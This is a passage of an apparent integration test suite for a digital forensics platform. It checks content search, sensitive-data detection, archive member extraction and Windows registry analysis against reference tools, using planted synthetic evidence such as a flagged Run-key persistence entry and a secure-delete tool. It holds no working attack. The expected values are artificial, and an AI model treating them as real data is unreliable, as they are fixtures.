    want = {CONTACTS_TXT: ('text', 'utf-8', 0), UTF16_NOTES: ('text', 'utf-16-le', 2), HANDOVER_DOCX: ('ooxml', None, 0),
            RTF_NOTES: ('rtf', None, 0), BUDGET_ODT: ('odf', None, 0), '/Users/alice/Documents/offer-letter.pdf': ('pdf', None, 0),
            '/Windows/System32/config/SYSTEM': ('strings', None, 0),
            '/Users/alice/AppData/Local/Google/Chrome/User Data/Default/History': ('sqlite', None, 0)}
    check('each kind of file is indexed the right way (decoded text, Word, RTF, OpenDocument, PDF, SQLite values, strings of a hive)',
          all(docs.get(p) == w for p, w in want.items()), {p: docs.get(p) for p in want})
    skipped = ['/Users/alice/Documents/private.zip', '/Users/alice/Documents/salary-review.docx', '/Users/alice/Documents/vault.dat',
               '/Users/alice/Pictures/whiteboard.png']
    check('encrypted files and pictures are not indexed', not any(p in docs for p in skipped), [p for p in skipped if p in docs])
    pdf = subprocess.run(['pdftotext', '-enc', 'UTF-8', '-', '-'], input=icat_bytes('/Users/alice/Documents/offer-letter.pdf'),
                         capture_output=True, timeout=60).stdout.decode()
    check('the PDF text equals pdftotext run directly', texts.get('/Users/alice/Documents/offer-letter.pdf', '').strip() == pdf.replace('\x0c', '').strip()
          and 'Offer letter - Alice Example' in pdf, (texts.get('/Users/alice/Documents/offer-letter.pdf'), pdf))
    check('the Word and OpenDocument text equals the text in their XML',
          ' '.join(texts.get(HANDOVER_DOCX, '').split()) == _xml_text(icat_bytes(HANDOVER_DOCX), 'word/document.xml')
          and ' '.join(texts.get(BUDGET_ODT, '').split()) == ' '.join(_xml_text(icat_bytes(BUDGET_ODT), 'content.xml').split()),
          (texts.get(HANDOVER_DOCX), texts.get(BUDGET_ODT)))
    check('the RTF text has no control words and decodes escaped characters',
          'Meeting notes 1 September: the USB drive CRUZER holds the export. Café at 10:00.' in texts.get(RTF_NOTES, '')
          and '\\' not in texts.get(RTF_NOTES, '') and 'Calibri' not in texts.get(RTF_NOTES, ''), texts.get(RTF_NOTES))

    # Content search: every copy of the payroll data, at the exact byte offsets.
    cs = lambda q, mode='text', who=inv, case=A: get(f'/api/forensics/content-search?case_id={case}&mode={mode}&q={urllib.parse.quote(q)}', who)
    r = cs('DE89370400440532013').json
    hits = {h['path']: h for h in r['files']}
    check('searching an IBAN prefix finds the payroll data in the renamed copy, the Recycle Bin copy, the deleted original, the Word document '
          'and the copy attached to an email', set(hits) == set(PAYROLL_COPIES) | {HANDOVER_DOCX, EMAILED_PAYROLL} and r['complete'], sorted(hits))
    check('...the emailed copy as a member of the mailbox, all 60 occurrences', hits.get(EMAILED_PAYROLL, {}).get('member') is True
          and hits.get(EMAILED_PAYROLL, {}).get('match_count') == 60, hits.get(EMAILED_PAYROLL))
    bad = []
    for p in PAYROLL_COPIES:
        data = icat_bytes(p)
        truth = [i for i in range(len(data)) if data.startswith(b'DE89370400440532013', i)]
        got = [m['byte_offset'] for m in hits.get(p, {}).get('matches', [])]
        if hits.get(p, {}).get('match_count') != len(truth) or got != truth[:len(got)] or not got:
            bad.append((p, hits.get(p, {}).get('match_count'), len(truth)))
    check('...with every occurrence counted (60 per copy) and each byte offset equal to where the bytes are', not bad, bad)
    check('...a deleted file is marked, and text taken out of a Word document has no byte offset',
          hits[PAYROLL_COPIES[1]]['deleted'] and hits[HANDOVER_DOCX]['method'] == 'ooxml'
          and all(m['byte_offset'] is None for m in hits[HANDOVER_DOCX]['matches']), hits.get(HANDOVER_DOCX))
    first = hits[PAYROLL_COPIES[0]]['matches'][0]
    page = get(f"/api/forensics/evidence/{E}/content?inode={hits[PAYROLL_COPIES[0]]['inode']}&offset=2048&start={first['byte_offset']}&length=19", inv).json
    import base64
    check('the file viewer at the reported offset shows the matched bytes', base64.b64decode(page['data_b64']) == b'DE89370400440532013', page)
    r = cs('sandisk').json
    hits = {h['path']: h for h in r['files']}
    raw = icat_bytes(UTF16_NOTES)
    m = (hits.get(UTF16_NOTES) or {}).get('matches', [{}])[0]
    check('search is case-insensitive and finds UTF-16 text at its byte offset (2-byte characters after the byte-order mark)',
          m.get('byte_offset') == raw.index('SanDisk'.encode('utf-16-le')) and m.get('byte_length') == 14 and m.get('match') == 'SanDisk', m)
    setup = (hits.get('/Windows/INF/setupapi.dev.log') or {}).get('matches', [{}])[0]
    check('...and in the CRLF text of setupapi.dev.log', setup.get('byte_offset') == icat_bytes('/Windows/INF/setupapi.dev.log').index(b'SanDisk'), setup)
    lnk = '/Users/alice/AppData/Roaming/Microsoft/Windows/Recent/payroll-export.csv.lnk'
    r = cs('payroll-export.csv').json
    hl = next((h for h in r['files'] if h['path'] == lnk), {})
    check('strings of a binary file (the shortcut) are searchable with their offsets',
          hl and all(icat_bytes(lnk)[mm['byte_offset']:mm['byte_offset'] + mm['byte_length']].decode('utf-16-le' if mm['byte_length'] == 36 else 'latin-1').lower()
                     == 'payroll-export.csv' for mm in hl['matches']), hl)
    r = cs(r'emp05\d,DE\d{20}', 'regex').json
    check('a regular expression (RE2) finds the ten emp05x rows in each copy',
          {h['path'] for h in r['files']} == set(PAYROLL_COPIES) | {EMAILED_PAYROLL} and all(h['match_count'] == 10 for h in r['files']),
          [(h['path'], h['match_count']) for h in r['files']])
    r = cs(r'[A-Z]:\\[a-z]+-export\.csv', 'regex').json
    check('a regular expression without a long literal scans every file (the drive path in the shortcut)', any(h['path'] == lnk for h in r['files']), [h['path'] for h in r['files']])
    check('an invalid or unsupported regular expression is refused (400)', cs('(unclosed', 'regex').status == 400 and cs(r'(a)\1', 'regex').status == 400)
    check('fewer than 3 characters and an unknown mode are refused (400)', cs('ab').status == 400 and cs('payroll', 'fuzzy').status == 400)
    t0 = time.time()
    slow = cs('(x+x+)+y', 'regex')
    check('a pathological regular expression finishes quickly (RE2 runs in linear time)', slow.status == 200 and time.time() - t0 < 20, (slow.status, time.time() - t0))
    check('another investigator gets 404', cs('payroll', who=C['INV2']).status == 404)
    nb = cs('payroll', case=C['B']).json
    check('evidence without a content index is listed as not indexed', C['B_E'] in [x['evidence_id'] for x in nb['not_indexed']] and nb['files'] == [], nb)
    audit = list(db.audit_logs.find({'action': 'CONTENT_SEARCHED'}))
    check('content searches are recorded in the audit log with the query', any(a.get('metadata', {}).get('query') == 'DE89370400440532013' for a in audit), len(audit))

    # Found data.
    fd = lambda qs='': get(f'/api/forensics/entities?case_id={A}&limit=500{qs}', inv).json
    rows = fd()['data']
    by_kind = {}
    for x in rows:
        by_kind.setdefault(x['kind'], {})[x.get('value') or x['display']] = x
    emails = set(by_kind.get('email', {}))
    check('email addresses: exactly the planted ones (contacts file, Word documents, the browser, mail and chat profiles)',
          emails == PLANTED_EMAILS, (sorted(emails - PLANTED_EMAILS), sorted(PLANTED_EMAILS - emails)))
    zoe = get(f"/api/forensics/entities/{by_kind['email']['zoe.martin@example.org']['_id']}", inv).json
    occ = zoe['occurrences'][0]
    check('...each occurrence with its file and byte offset (Zoë: a 2-byte character earlier in the line)',
          occ['path'] == CONTACTS_TXT and occ['byte_offset'] == icat_bytes(CONTACTS_TXT).index(b'zoe.martin@example.org'), occ)
    check('IBANs: only the two with valid check digits (59 payroll IBANs fail mod-97)',
          set(by_kind.get('iban', {})) == {'GB82WEST12345698765432', 'DE89370400440532013000'}
          and by_kind['iban']['DE89370400440532013000']['count'] == 5 and by_kind['iban']['GB82WEST12345698765432']['file_count'] == 2,
          {k: (v['count'], v['file_count']) for k, v in by_kind.get('iban', {}).items()})
    cards = list(by_kind.get('card', {}).values())
    check('card numbers: the Visa test card, masked; the mistyped one (Luhn fails) is not reported',
          [c['display'] for c in cards] == ['Visa •••• 1111'] and 'value' not in cards[0], cards)
    rv = post(f"/api/forensics/entities/{cards[0]['_id']}/reveal", inv)
    check('showing the full card number returns it and is recorded in the audit log',
          rv.status == 200 and rv.json['value'] == '4111111111111111'
          and db.audit_logs.find_one({'action': 'SENSITIVE_VALUE_REVEALED', 'resource_id': cards[0]['_id']}), rv)
    check('Aadhaar: the Verhoeff-valid number, masked', [x['display'] for x in by_kind.get('aadhaar', {}).values()] == ['•••• •••• 0124'], by_kind.get('aadhaar'))
    check('cryptocurrency: the Bitcoin and EIP-55 Ethereum addresses',
          set(by_kind.get('crypto', {})) == {'1BoatSLRHtKNngkdXEeobR76b53LETtpyT', '0x5aaeb6053f3e94c9b9a09f33669435e7ef1beaed'}, set(by_kind.get('crypto', {})))
    check('phone numbers: the planted ones (text file, RTF, the Skype contact)',
          set(by_kind.get('phone', {})) == {'+442079460958', '+12025550143', '+12125550147'}, set(by_kind.get('phone', {})))
    ips = set(by_kind.get('ip', {}))
    check('IP addresses include the planted one and the interface in the SYSTEM hive, not its netmask',
          {'10.20.30.40', '192.168.1.57'} <= ips and '255.255.255.0' not in ips, ips)
    history = {u for _, u, *_ in CHROME_VISITS} | {'https://tools.example.org/securedelete'} | PLANTED_URLS  # visits, the download's page, profiles
    # Security.evtx holds the namespace of event 1102's UserData as text, which the strings of the log expose. (The event
    # namespace is there too, but it follows a length byte that reads as "5", so it is not a separate word.)
    history.add('http://manifests.microsoft.com/win/2004/08/windows/eventlog')
    # SecureDelete.exe's signature holds its publisher's link as a DER string with nothing after it but the next element's
    # tag, 0x30, which reads as "0" (as "http://www.microsoft.com0" in the strings of Microsoft-signed files): the known
    # run-on of values in binary strings. Taken from the program's bytes.
    link = b'https://tools.example.org/securedelete'
    exe = icat_bytes(SECUREDELETE_EXE)
    tail = exe[exe.index(link) + len(link):][:1]
    history.add((link + tail).decode() if tail == b'0' else link.decode())
    urls = set(by_kind.get('url', {}))
    check('web addresses are exactly the URLs of the browser history and the contacts file, each whole (database values read apart)',
          urls == history, (sorted(urls - history), sorted(history - urls)))
    kinds = fd()['kinds']
    check('the count per kind matches the rows', all(kinds[k] == len(by_kind.get(k, {})) for k in kinds), (kinds, {k: len(v) for k, v in by_kind.items()}))
    check('found data can be filtered by kind and searched by what is shown (not by a masked full number)',
          fd('&kind=email')['total'] == len(PLANTED_EMAILS) and fd('&q=1111')['total'] >= 1 and fd('&q=4111111111111111')['total'] == 0)
    s = get(f'/api/forensics/search?case_id={A}&q=zoe.martin', inv).json
    check('keyword search finds found data', s['totals'].get('found') == 1, s['totals'])
    check('another investigator gets 404 for the list and a value',
          get(f'/api/forensics/entities?case_id={A}', C['INV2']).status == 404 and get(f"/api/forensics/entities/{zoe['_id']}", C['INV2']).status == 404
          and post(f"/api/forensics/entities/{cards[0]['_id']}/reveal", C['INV2']).status == 404)
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'ENTITY', 'item_id': zoe['_id'], 'label': 'NOTABLE', 'note': 'personal contact'})
    j = _analyse(inv, E, {'modules': ['found_data']})
    check('a found value can be tagged, and the tag follows it when found data is rebuilt',
          t.status == 200 and t.json['snapshot']['title'] == 'zoe.martin@example.org' and j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0},
          (t, j.get('result', {}).get('summary', {}).get('tags')))
    req('DELETE', f"/api/tags/{t.json['tag_id']}", inv)
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    check('the overview counts found data', ov.get('found_data') == len(rows), (ov.get('found_data'), len(rows)))
    C['CONTENT_INDEXED'] = True


EXPORT_ZIP = '/Users/alice/Documents/export-backup.zip'
Q3_DOCX = '/Users/alice/Documents/q3-payroll.docx'
STATEMENT_PDF = '/Users/alice/Documents/statement.pdf'


def _members_truth(tmp: Path) -> dict:
    """Every member the generator embedded, read with tools independent of DFIP: {member path: SHA-256}."""
    import io
    import zipfile
    import olefile
    truth = {}
    z = zipfile.ZipFile(io.BytesIO(icat_bytes(EXPORT_ZIP)))
    for name in z.namelist():
        truth[f'{EXPORT_ZIP}!/{name}'] = hashlib.sha256(z.read(name)).hexdigest()
    (tmp / 'archive.7z').write_bytes(z.read('archive.7z'))
    inner = sh('7z', 'x', '-so', str(tmp / 'archive.7z'), 'q3-salaries.csv').stdout
    truth[f'{EXPORT_ZIP}!/archive.7z!/q3-salaries.csv'] = hashlib.sha256(inner).hexdigest()
    d = zipfile.ZipFile(io.BytesIO(icat_bytes(Q3_DOCX)))
    for name in ('word/media/image1.png', 'word/embeddings/oleObject1.bin'):
        truth[f'{Q3_DOCX}!/{name}'] = hashlib.sha256(d.read(name)).hexdigest()
    native = olefile.OleFileIO(io.BytesIO(d.read('word/embeddings/oleObject1.bin'))).openstream('\x01Ole10Native').read()
    # Ole10Native: total size, flags, label, source path, two longs, temporary path, data size, data.
    parts = native[6:].split(b'\x00', 2)
    rest = parts[2][8:]
    rest = rest[rest.index(b'\x00') + 1:]
    size = struct.unpack('<I', rest[:4])[0]
    truth[f'{Q3_DOCX}!/word/embeddings/oleObject1.bin!/payroll-summary.txt'] = hashlib.sha256(rest[4:4 + size]).hexdigest()
    (tmp / 'statement.pdf').write_bytes(icat_bytes(STATEMENT_PDF))
    sh('pdfdetach', '-save', '1', '-o', str(tmp / 'att.bin'), str(tmp / 'statement.pdf'))
    truth[f'{STATEMENT_PDF}!/transfer-details.txt'] = hashlib.sha256((tmp / 'att.bin').read_bytes()).hexdigest()
    return truth


@section('12f Archives, embedded files and unallocated space (vs zipfile, 7-Zip, olefile, pdfdetach, istat and the raw image)')
def t_containers():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    db = mongo()
    j = _analyse(inv, E, {'modules': ['containers', 'unallocated']})
    s = (j.get('result') or {}).get('summary') or {}
    check('the new modules run, and the modules that read their output are refreshed',
          j.get('status') == 'COMPLETED' and s.get('plan') == ['containers', 'chat_cloud', 'media', 'executables', 'reputation', 'clamav', 'hash_match', 'yara', 'content',
                                                         'unallocated', 'found_data'],
          (j.get('status'), s.get('plan'), j.get('error')))
    # Archive and document members (email attachments are members too, from the email module: see 12m).
    members = {x['path']: x for x in db.fs_entries.find({'evidence_id': E, 'container': {'$exists': True}, 'container.kind': {'$ne': 'email'}})}
    attachments = db.fs_entries.count_documents({'evidence_id': E, 'container.kind': 'email'})
    with tempfile.TemporaryDirectory() as tmp:
        truth = _members_truth(Path(tmp))
    got = {p: m.get('sha256') for p, m in members.items() if p in truth}
    check(f'every embedded file ({len(truth)}) is found, two levels deep, with the SHA-256 of its true content',
          got == truth, {p: (got.get(p), h) for p, h in truth.items() if got.get(p) != h})
    nested = members.get(f'{EXPORT_ZIP}!/archive.7z!/q3-salaries.csv', {})
    ole = members.get(f'{Q3_DOCX}!/word/embeddings/oleObject1.bin!/payroll-summary.txt', {})
    check('nested members record their depth and parent (a 7z inside a ZIP, a package inside an OLE object inside a Word file)',
          nested.get('container', {}).get('depth') == 2 and nested['container']['parent'] == f'{EXPORT_ZIP}!/archive.7z'
          and nested['container']['kind'] == '7z' and ole.get('container', {}).get('kind') == 'ole' and ole['container']['depth'] == 2,
          (nested.get('container'), ole.get('container')))
    enc = members.get('/Users/alice/Documents/private.zip!/payroll-export.csv', {})
    check('the encrypted ZIP: its member is listed and flagged, not extracted',
          enc.get('container', {}).get('encrypted') is True and not enc.get('sha256') and not enc['container'].get('store')
          and (enc.get('encryption') or {}).get('kind') == 'ZIP' and enc.get('size') == len(PAYROLL), enc)
    unexpected = sorted(set(members) - set(truth) - {enc.get('path')})
    check('no other member is reported (Word and OpenDocument XML parts are not members; plain PDFs have no attachments)', not unexpected, unexpected)
    zipdoc = db.fs_entries.find_one({'evidence_id': E, 'path': EXPORT_ZIP})
    check("the container's record says what it holds", (zipdoc.get('archive') or {}).get('members') == 3 and zipdoc['archive']['extracted'] == 3,
          zipdoc.get('archive'))
    m_pay = members.get(f'{EXPORT_ZIP}!/payroll-export.csv', {})
    check('a member is hashed, typed and matched with the hash sets like any file (the payroll copy is notable)',
          m_pay.get('mime') == 'text/csv' and m_pay.get('hash_status') == 'NOTABLE'
          and members.get(f'{Q3_DOCX}!/word/media/image1.png', {}).get('file_category') == 'image', (m_pay.get('mime'), m_pay.get('hash_status')))
    fl = lambda qs: get(f'/api/forensics/evidence/{E}/files?limit=1000&{qs}', inv).json
    real = [e for e in C['TRUTH'] if not e['virtual']]
    check('the Files list keeps file-system files and archive contents apart',
          fl('')['total'] == len(real) and fl('members=true')['total'] == len(members) + attachments, (fl('')['total'], len(real), fl('members=true')['total']))
    counts = get(f'/api/evidence/{E}', inv).json['modules']['containers']['counts']
    check('the module counts what it found', counts.get('members_found') == len(members) and counts.get('members_encrypted') == 1
          and counts.get('members_extracted') == len(truth), counts)

    # Viewing and recovering a member.
    readme = members[f'{EXPORT_ZIP}!/notes/readme.txt']
    mid = str(readme['_id'])
    pv = get(f'/api/forensics/members/{mid}/preview', inv).json or {}
    check('a member can be viewed (text preview of notes/readme.txt)', pv.get('kind') == 'text' and 'Backup of the September payroll export' in pv.get('text', ''), pv)
    check('an encrypted member cannot be viewed (409); another investigator gets 404',
          get(f"/api/forensics/members/{enc['_id']}/preview", inv).status == 409 and get(f'/api/forensics/members/{mid}/preview', C['INV2']).status == 404)
    rec = post(f"/api/forensics/members/{nested['_id']}/recover", inv)
    art = rec.json or {}
    check('a member can be recovered: hashed, in the chain of custody', rec.status == 200 and art.get('sha256') == truth[f'{EXPORT_ZIP}!/archive.7z!/q3-salaries.csv']
          and any(c.get('artifact_id') == art.get('artifact_id') and c['action'] == 'FILE_RECOVERED' for c in get(f'/api/chain?case_id={A}', inv).json['data']), rec)
    check('viewers and analysts cannot recover members (403)', post(f"/api/forensics/members/{nested['_id']}/recover", C['VIEWER']).status == 403)

    # Content search and found data over members and unallocated space.
    cs = lambda q: get(f'/api/forensics/content-search?case_id={A}&q={urllib.parse.quote(q)}', inv).json
    r = cs('DE89370400440532013')
    paths = {h['path'] for h in r['files']}
    check('the payroll data is now also found inside export-backup.zip', f'{EXPORT_ZIP}!/payroll-export.csv' in paths, sorted(paths))
    un = [h for h in r['files'] if h.get('unallocated')]
    pay = next(e for e in C['TRUTH'] if e['path'] == '/Users/alice/Documents/payroll-export.csv' and e['deleted'])
    ist = sh('istat', '-o', '2048', str(IMG), pay['inode']).stdout.decode()
    sectors = {int(x) for x in re.findall(r'\d+', ist.split('Sectors:', 1)[-1])}
    with IMG.open('rb') as f:
        def raw(off, n):
            f.seek(2048 * 512 + off)
            return f.read(n)
        bad = [(m['byte_offset'], raw(m['byte_offset'], 19)) for h in un for m in h['matches'] if raw(m['byte_offset'], 19) != b'DE89370400440532013']
        check('...and in unallocated space, where the deleted export\'s clusters still hold it: every hit\'s volume offset holds the bytes',
              un and not bad and sum(h['match_count'] for h in un) >= 60, (len(un), bad[:3]))
        check("...inside the deleted file's own sectors (istat)", all(m['byte_offset'] // 512 in sectors for h in un for m in h['matches']),
              [m['byte_offset'] // 512 for h in un for m in h['matches']][:5])
        page = get(f"/api/forensics/evidence/{E}/volume?volume_id=p2048&start={un[0]['matches'][0]['byte_offset']}&length=19", inv).json
        import base64
        check('the volume viewer shows the bytes at an unallocated hit', base64.b64decode(page['data_b64']) == b'DE89370400440532013', page)
    check('the volume viewer refuses an unknown volume (400); another investigator gets 404',
          get(f'/api/forensics/evidence/{E}/volume?volume_id=x', inv).status == 400 and get(f'/api/forensics/evidence/{E}/volume?volume_id=p2048', C['INV2']).status == 404)
    r = cs('finance.team@example.com')
    hit = next((h for h in r['files'] if h['path'].endswith('!/payroll-summary.txt')), {})
    m0 = (hit.get('matches') or [{}])[0]
    mem = get(f"/api/forensics/members/{hit.get('entry_id')}/content?start={m0.get('byte_offset')}&length=24", inv).json or {}
    import base64
    check('text inside a nested member is searchable, with its byte offset in the member',
          hit.get('member') is True and base64.b64decode(mem.get('data_b64', '')) == b'finance.team@example.com', (hit, mem))
    rows = get(f'/api/forensics/entities?case_id={A}&limit=500', inv).json['data']
    vals = {(x['kind'], x.get('value') or x['display']): x for x in rows}
    check('found data includes values from members (the IBAN in the embedded package, the e-mails in the nested 7z and the PDF attachment)',
          ('iban', 'FR7630006000011234567890189') in vals and ('email', 'finance.team@example.com') in vals and ('email', 'bob.smith@example.org') in vals,
          sorted(k for k in vals if k[0] in ('iban', 'email')))
    de = get(f"/api/forensics/entities/{vals[('iban', 'DE89370400440532013000')]['_id']}", inv).json
    unocc = [o for o in de['occurrences'] if o['method'] == 'unallocated']
    with IMG.open('rb') as f:
        f.seek(2048 * 512 + (unocc[0]['byte_offset'] if unocc else 0))
        check('...and from unallocated space, at volume offsets that hold the value', unocc and f.read(22) == b'DE89370400440532013000', unocc[:1])
    fr = get(f"/api/forensics/entities/{vals[('iban', 'FR7630006000011234567890189')]['_id']}", inv).json
    check('a value found in a member names the member, so it can be viewed', all(o.get('member') and o.get('entry_id') for o in fr['occurrences']), fr['occurrences'])
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    check('the overview counts archive members and email attachments', ov.get('archive_members') == len(members) + attachments,
          (ov.get('archive_members'), len(members), attachments))
    C['ARCHIVE_MEMBERS'] = len(members)


NTUSER = '/Users/alice/NTUSER.DAT'
USRCLASS = '/Users/alice/AppData/Local/Microsoft/Windows/UsrClass.dat'
AMCACHE = '/Windows/AppCompat/Programs/Amcache.hve'
SECUREDELETE_SHA1 = hashlib.sha1(b'SecureDelete.exe 1.4.0 test binary').hexdigest()  # make_hives.py


def _rr(path_or_local, plugin):
    """RegRipper (rip.pl) output for one plugin, on a hive from the image or a local file."""
    local = path_or_local
    if str(path_or_local).startswith('/') and not Path(path_or_local).is_file():
        local = Path(tempfile.mkdtemp()) / str(path_or_local).rsplit('/', 1)[-1]
        local.write_bytes(icat_bytes(path_or_local))
    out = sh('regripper', '-r', str(local), '-p', plugin, timeout=300)
    return out.stdout.decode('utf-8', 'replace')


def _rr_time(text):
    return datetime.strptime(text.strip().rstrip('Z'), '%Y-%m-%d %H:%M:%S').replace(tzinfo=timezone.utc)


def _close(a, b, seconds=1):
    """RegRipper converts FILETIMEs through floating point and can print a second early."""
    return a is not None and b is not None and abs((iso(a) if isinstance(a, str) else a) - b) <= timedelta(seconds=seconds)


@section('12g Registry activity (vs RegRipper and libregf on the hives, and the generator)')
def t_registry():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    rows = lambda t, extra='': get(f'/api/forensics/registry?case_id={A}&type={t}{extra}', inv).json['data']
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the registry module ran with the standard analysis', (mods.get('registry') or {}).get('status') == 'COMPLETED', mods.get('registry'))
    hives = {h['path']: h for h in get(f'/api/forensics/registry/hives?case_id={A}', inv).json['data']}
    want = {NTUSER: 'NTUSER', USRCLASS: 'USRCLASS', AMCACHE: 'AMCACHE', '/Windows/System32/config/SYSTEM': 'SYSTEM',
            '/Windows/System32/config/SOFTWARE': 'SOFTWARE'}
    check('every hive is found, with its SHA-256, owner and transaction-log state (clean)',
          all(hives.get(p, {}).get('kind') == k and hives[p]['sha256'] == hashlib.sha256(icat_bytes(p)).hexdigest()
              and hives[p]['state'].startswith('clean') for p, k in want.items())
          and hives[NTUSER]['user'] == 'alice' and hives[NTUSER]['sid'] == ALICE_SID and hives[USRCLASS]['sid'] == ALICE_SID,
          {p: (h.get('kind'), h.get('user'), h.get('sid'), h.get('state')) for p, h in hives.items()})
    dirty = _rr(NTUSER, 'userassist')
    local_nt = Path(tempfile.mkdtemp()) / 'NTUSER.DAT'
    local_nt.write_bytes(icat_bytes(NTUSER))
    rr_dirty = (sh('regripper', '-r', str(local_nt), '-d').stdout + sh('regripper', '-r', str(local_nt), '-d').stderr).decode().lower()
    check('RegRipper agrees the user hive is not dirty (no transaction logs needed)', 'not dirty' in rr_dirty, rr_dirty[:200])

    # NTUSER.DAT, against RegRipper.
    ua = {r['program'].rsplit('\\', 1)[-1]: r for r in rows('USERASSIST')}
    truth = {}
    cur = None
    for line in dirty.splitlines():
        if re.match(r'^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}Z$', line.strip()):
            cur = _rr_time(line)
        m = re.match(r'^\s+(\S.*)\s\((\d+)\)$', line)
        if m and cur:
            truth[m.group(1).rsplit('\\', 1)[-1]] = (int(m.group(2)), cur)
    check('UserAssist: programs, run counts and last-run times equal RegRipper (ROT13 decoded, each entry once)',
          set(ua) == set(truth) and all(ua[k]['run_count'] == c and _close(ua[k]['last_run'], t) for k, (c, t) in truth.items()),
          ({k: (v['run_count'], v['last_run']) for k, v in ua.items()}, truth))
    check("UserAssist: known folders resolved with alice's profile", ua.get('SecureDelete.exe', {}).get('program') == 'C:\\Users\\alice\\Downloads\\SecureDelete.exe'
          and ua.get('notepad.exe', {}).get('program') == 'C:\\Windows\\System32\\notepad.exe', [r['program'] for r in ua.values()])
    ww = sorted(rows('EXPLORER_SEARCH'), key=lambda r: r['order'])
    rr_ww = re.findall(r'^(\d+)\s+(\S.*?)\s*$', _rr(NTUSER, 'wordwheelquery').split('MRUListEx order', 1)[-1], re.M)
    rr_ww_time = _rr_time(re.search(r'LastWrite Time (\S+ \S+)', _rr(NTUSER, 'wordwheelquery')).group(1))
    check('Explorer searches: the terms in most-recent-first order and the key time equal RegRipper ("payroll" last)',
          [r['value'] for r in ww] == [t for _, t in rr_ww] == ['payroll', 'usb wipe'] and _close(ww[0]['key_last_write'], rr_ww_time), (ww, rr_ww))
    tp = [r['value'] for r in sorted(rows('TYPED_PATH'), key=lambda r: r['order'])]
    check('typed paths equal RegRipper', tp == re.findall(r'^url\d+\s+(\S.*?)\s*$', _rr(NTUSER, 'typedpaths'), re.M) == ['E:\\Exports', 'C:\\Users\\alice\\Documents'], tp)
    rd = [r['value'] for r in sorted(rows('RECENT_DOC'), key=lambda r: r['order']) if not r.get('extension')]
    rr_rd = re.findall(r'^\s+(\d+) = (\S.*)$', _rr(NTUSER, 'recentdocs').split('RecentDocs\\.', 1)[0], re.M)
    check('recent documents (RecentDocs) in order equal RegRipper', rd == [n for _, n in rr_rd] == ['payroll-export.csv', 'q3-payroll.docx'], (rd, rr_rd))
    mru = [r['value'] for r in sorted(rows('RUN_MRU'), key=lambda r: r['order'])]
    rr_mru = dict(re.findall(r'^([a-z])\s+(\S.*?)\\1\s*$', _rr(NTUSER, 'runmru'), re.M))
    order = re.search(r'MRUList = (\w+)', _rr(NTUSER, 'runmru')).group(1)
    check('Run dialog commands in order equal RegRipper (most recent: the PowerShell cleanup)', mru == [rr_mru[x] for x in order] and 'cleanup.ps1' in mru[0], (mru, rr_mru))
    pers = rows('PERSISTENCE')
    upd = next((p for p in pers if p['name'] == 'Updater'), {})
    check('the user Run key (Updater, from a user profile) equals RegRipper and is flagged',
          'Updater - C:\\Users\\alice\\AppData\\Roaming\\updater.exe -silent' in _rr(NTUSER, 'run') and upd.get('user') == 'alice'
          and upd.get('command') == 'C:\\Users\\alice\\AppData\\Roaming\\updater.exe -silent' and upd.get('flags'), upd)
    rdp = rows('RDP_CONNECTION')
    ts = _rr(NTUSER, 'tsclient')
    check('remote desktop: server, user hint and key time equal RegRipper',
          [(r['server'], r['username_hint']) for r in rdp] == [('fileserver.corp.example', 'CORP\\alice')] and 'UsernameHint: CORP\\alice' in ts
          and _close(rdp[0]['key_last_write'], _rr_time(re.search(r'fileserver\.corp\.example\s+LastWrite time: (\S+ \S+)', ts).group(1))), rdp)
    f, _ = _hive(NTUSER)
    nd = rows('NETWORK_DRIVE')
    check('the mapped network drive equals the value read with libregf',
          [(r['drive'], r['remote_path']) for r in nd] == [('Z', _regval(f, 'Network\\Z', 'RemotePath'))], nd)

    # UsrClass.dat ShellBags, against RegRipper.
    sb = {r['path']: r for r in rows('SHELLBAG')}
    rr_sb = [[c.strip() for c in line.split('|')] for line in _rr(USRCLASS, 'shellbags').splitlines() if line.count('|') >= 6 and re.match(r'^\d{4}', line)]
    rr_paths = {re.sub(r'^My Computer\\', '', re.sub(r'\s*\[Desktop.*$', '', r[6])): r for r in rr_sb}
    check('folders browsed equal RegRipper (This PC > E:\\ > Exports)', set(sb) == set(rr_paths) and 'E:\\Exports' in sb, (sorted(sb), sorted(rr_paths)))
    ex, rex = sb.get('E:\\Exports', {}), rr_paths.get('E:\\Exports', [''] * 7)
    check("E:\\Exports: created, modified, accessed and MFT reference from the shell item equal RegRipper",
          _close(ex.get('created'), _rr_time(rex[3])) and _close(ex.get('modified'), _rr_time(rex[1])) and _close(ex.get('accessed'), _rr_time(rex[2]))
          and rex[5] == '41/2', (ex, rex))

    # Amcache, ShimCache, BAM, against RegRipper.
    am = rows('AMCACHE_FILE')
    rr_am = _rr(AMCACHE, 'amcache')
    check('Amcache: path, SHA-1 and first-recorded time equal RegRipper',
          [(r['path'], r['sha1']) for r in am] == [('c:\\users\\alice\\downloads\\securedelete.exe', SECUREDELETE_SHA1)]
          and f'Hash: {SECUREDELETE_SHA1}' in rr_am and _close(am[0]['key_last_write'], _rr_time(re.search(r'LastWrite: (\S+ \S+)', rr_am).group(1))), am)
    shim = {r['path']: r for r in rows('SHIMCACHE_ENTRY')}
    rr_shim = {m[0]: _rr_time(m[1]) for m in re.findall(r'^(\S.*?)\s{2}(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})$', _rr('/Windows/System32/config/SYSTEM', 'appcompatcache'), re.M)}
    check('ShimCache: paths and file modification times equal RegRipper', set(shim) == set(rr_shim) and all(_close(shim[p]['last_modified'], t) for p, t in rr_shim.items()),
          ({p: r['last_modified'] for p, r in shim.items()}, rr_shim))
    bam_rows = {r['device_path']: r for r in rows('BAM_ENTRY')}
    rr_bam = {m[1]: _rr_time(m[0]) for m in re.findall(r'^\s+(\S+ \S+Z) - (\S.*)$', _rr('/Windows/System32/config/SYSTEM', 'bam'), re.M)}
    check("BAM: programs, last-run times and the user (from the SID) equal RegRipper",
          set(bam_rows) == set(rr_bam) and all(_close(bam_rows[p]['last_run'], t) for p, t in rr_bam.items())
          and all(r['user'] == 'alice' and r['sid'] == ALICE_SID for r in bam_rows.values()), bam_rows)

    # Persistence and installed programs, against RegRipper.
